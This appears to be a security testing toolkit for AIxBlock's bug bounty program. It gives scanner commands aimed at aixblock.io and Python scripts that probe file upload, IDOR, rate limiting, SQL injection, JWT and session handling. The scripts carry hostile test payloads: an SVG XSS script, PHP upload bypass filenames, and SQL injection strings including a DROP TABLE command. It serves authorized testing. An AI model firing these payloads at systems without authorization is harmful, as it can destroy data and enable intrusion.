# Security Testing Toolkit

## 🛠️ Automated Security Testing Tools

### Web Application Scanners
```bash
# Burp Suite Professional
# - Comprehensive web app security testing
# - Active/passive scanning
# - Manual testing proxy
# - Custom extensions

# OWASP ZAP
zap-baseline.py -t https://app.aixblock.io
zap-full-scan.py -t https://app.aixblock.io

# Nuclei - Fast vulnerability scanner
nuclei -u https://app.aixblock.io -t nuclei-templates/
```

### API Security Testing
```bash
# Custom endpoint enumeration
python3 api_enum.py --target https://api.aixblock.io

# API security testing with ffuf
ffuf -w wordlist.txt -u https://api.aixblock.io/FUZZ -mc 200,301,302,403

# GraphQL testing (if applicable)
python3 graphql_test.py --endpoint https://api.aixblock.io/graphql
```

### Authentication Testing
```bash
# JWT token analysis
python3 jwt_tool.py -t <JWT_TOKEN>

# Session management testing
python3 session_test.py --target https://app.aixblock.io

# OAuth/Web3Auth testing
python3 oauth_test.py --provider web3auth
```

## 🔍 Manual Testing Scripts

### File Upload Security Testing
```python
#!/usr/bin/env python3
"""
File Upload Security Tester
Tests various file upload vulnerabilities
"""

import requests
import os

def test_svg_xss(upload_url, session_cookies):
    """Test SVG XSS vulnerability"""
    svg_payload = '''<?xml version="1.0" standalone="no"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
    "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
       <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
       <script type="text/javascript">
          alert('XSS in SVG');
       </script>
    </svg>'''
    
    files = {'file': ('test.svg', svg_payload, 'image/svg+xml')}
    response = requests.post(upload_url, files=files, cookies=session_cookies)
    return response

def test_file_type_bypass(upload_url, session_cookies):
    """Test file type validation bypass"""
    # Test various bypass techniques
    bypasses = [
        ('test.php.jpg', 'image/jpeg'),
        ('test.jsp%00.jpg', 'image/jpeg'),
        ('test.asp;.jpg', 'image/jpeg')
    ]
    
    results = []
    for filename, content_type in bypasses:
        files = {'file': (filename, '<?php echo "test"; ?>', content_type)}
        response = requests.post(upload_url, files=files, cookies=session_cookies)
        results.append((filename, response.status_code, response.text))
    
    return results
```

### API Security Testing
```python
#!/usr/bin/env python3
"""
API Security Testing Suite
"""

import requests
import json
import time

class APISecurityTester:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url
        self.headers = {'Content-Type': 'application/json'}
        if auth_token:
            self.headers['Authorization'] = f'Bearer {auth_token}'
    
    def test_idor(self, endpoint_template, user_ids):
        """Test for Insecure Direct Object Reference"""
        results = []
        for user_id in user_ids:
            url = f"{self.base_url}/{endpoint_template.format(id=user_id)}"
            response = requests.get(url, headers=self.headers)
            results.append({
                'user_id': user_id,
                'status_code': response.status_code,
                'accessible': response.status_code == 200
            })
        return results
    
    def test_rate_limiting(self, endpoint, requests_count=100):
        """Test rate limiting implementation"""
        responses = []
        start_time = time.time()
        
        for i in range(requests_count):
            response = requests.get(f"{self.base_url}/{endpoint}", headers=self.headers)
            responses.append({
                'request_num': i,
                'status_code': response.status_code,
                'timestamp': time.time() - start_time
            })
            
            if response.status_code == 429:  # Rate limited
                break
        
        return responses
    
    def test_sql_injection(self, endpoint, parameters):
        """Test for SQL injection vulnerabilities"""
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL, NULL, NULL --",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
        ]
        
        results = []
        for param in parameters:
            for payload in sql_payloads:
                data = {param: payload}
                response = requests.post(f"{self.base_url}/{endpoint}", 
                                       json=data, headers=self.headers)
                results.append({
                    'parameter': param,
                    'payload': payload,
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'potential_vuln': 'error' in response.text.lower() or 
                                    response.status_code == 500
                })
        
        return results
```

### Authentication Bypass Testing
```python
#!/usr/bin/env python3
"""
Authentication Bypass Testing
"""

import requests
import jwt
import json

class AuthTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def test_jwt_manipulation(self, token):
        """Test JWT token manipulation"""
        try:
            # Decode without verification
            decoded = jwt.decode(token, options={"verify_signature": False})
            
            # Test privilege escalation
            escalated_token = decoded.copy()
            escalated_token['role'] = 'admin'
            escalated_token['permissions'] = ['*']
            
            # Re-encode (this will fail signature verification)
            manipulated_token = jwt.encode(escalated_token, 'secret', algorithm='HS256')
            
            return {
                'original_claims': decoded,
                'manipulated_token': manipulated_token,
                'test_required': True
            }
        except Exception as e:
            return {'error': str(e)}
    
    def test_session_fixation(self, login_endpoint):
        """Test session fixation vulnerability"""
        # Get initial session
        initial_response = self.session.get(self.target_url)
        initial_session_id = self.session.cookies.get('sessionid')
        
        # Attempt login with fixed session
        login_data = {'username': 'test', 'password': 'test'}
        login_response = self.session.post(f"{self.target_url}/{login_endpoint}", 
                                         data=login_data)
        
        # Check if session ID changed
        post_login_session_id = self.session.cookies.get('sessionid')
        
        return {
            'initial_session_id': initial_session_id,
            'post_login_session_id': post_login_session_id,
            'session_fixed': initial_session_id == post_login_session_id
        }
```

## 📊 Vulnerability Reporting Template

```markdown
# Vulnerability Report: [TITLE]

## Summary
Brief description of the vulnerability

## Severity
- **CVSS Score**: X.X
- **Severity Level**: Critical/High/Medium/Low
- **Impact**: [Description of potential impact]

## Technical Details
### Vulnerability Type
- [ ] Authentication Bypass
- [ ] Authorization Flaw
- [ ] Input Validation
- [ ] Business Logic Error
- [ ] Configuration Issue

### Affected Components
- **URL/Endpoint**: 
- **Parameter**: 
- **Method**: GET/POST/PUT/DELETE

## Reproduction Steps
1. Step 1
2. Step 2
3. Step 3

## Proof of Concept
```bash
# Commands or code to reproduce
```

## Impact Assessment
- **Confidentiality**: High/Medium/Low
- **Integrity**: High/Medium/Low  
- **Availability**: High/Medium/Low

## Proposed Fix
Detailed description of recommended remediation

## Fix Implementation
```python
# Proposed code fix
```

## Testing Verification
Steps to verify the fix works correctly
```

## 🔧 Environment Setup

### Local Testing Environment
```bash
# Clone target repository
git clone https://github.com/AIxBlock-2023/awesome-ai-dev-platform-opensource.git
cd awesome-ai-dev-platform-opensource

# Setup Python environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Setup Node.js environment
nvm use 18.19.0
cd frontend
npm install

# Setup databases
# PostgreSQL and Redis configuration
```

### Security Testing Dependencies
```bash
# Install security testing tools
pip install requests beautifulsoup4 pyjwt sqlparse
npm install -g @nuclei/nuclei

# Clone additional tools
git clone https://github.com/sqlmapproject/sqlmap.git
git clone https://github.com/ticarpi/jwt_tool.git
```

---

**Toolkit Version**: 1.0  
**Last Updated**: September 3, 2025  
**Compatibility**: AIxBlock Bug Bounty Program